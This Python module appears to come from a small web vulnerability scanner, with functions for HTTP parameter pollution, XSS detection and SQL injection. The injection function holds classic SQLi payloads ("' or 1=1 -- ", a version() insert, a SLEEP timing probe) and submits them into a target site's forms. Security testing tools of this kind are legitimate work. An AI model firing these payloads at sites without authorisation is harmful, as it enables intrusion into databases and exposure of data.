from urllib.parse import urlparse, parse_qs, urlencode
from CompareDiff import compare_pages, compare_pages_post, list_to_dict, generate_data_forms, find_forms
from modules import xss_alert_checker
def http_pollution(url, params):
    stand_url = urlparse(url)
    query_parameter = parse_qs(stand_url.query)
    all_params = {}
    for key, values in query_parameter.items():
        all_params[key] = values

    for key, value in params.items():
        if isinstance(value, list):
            for val in value:
                all_params.setdefault(key, []).append(val)
                #https://stackoverflow.com/questions/35918831/dict-setdefault-appends-one-extra-default-item-into-the-value-list
        else:
            all_params.setdefault(key, []).append(value)

    query = urlencode(all_params, doseq=True)
    updated_url = stand_url._replace(query=query).geturl()
    return compare_pages(url, updated_url)

def xss_post(url, forms, data):
    pass


def xss_get(url):

    if xss_alert_checker.test_xss_get(url):
        print("SUCCESSFUL XSS!!!")
        print("Found XSS for url:", url)
    else:
        print("FAILED XSS")
    


def sqlinjection(url, sqli_value, forms, data):
    sqli = {"Normal":"' or 1=1 -- ", "Insert":"x', (select version())) -- -", "Timing":"'-SLEEP(1) -- "}
    if not forms:
        forms = data
        return compare_pages_post(url, list_to_dict(forms))
    else:
        forms = find_forms(url)
        forms = generate_data_forms(forms, sqli[sqli_value], True)
        return compare_pages_post(url, forms[0])
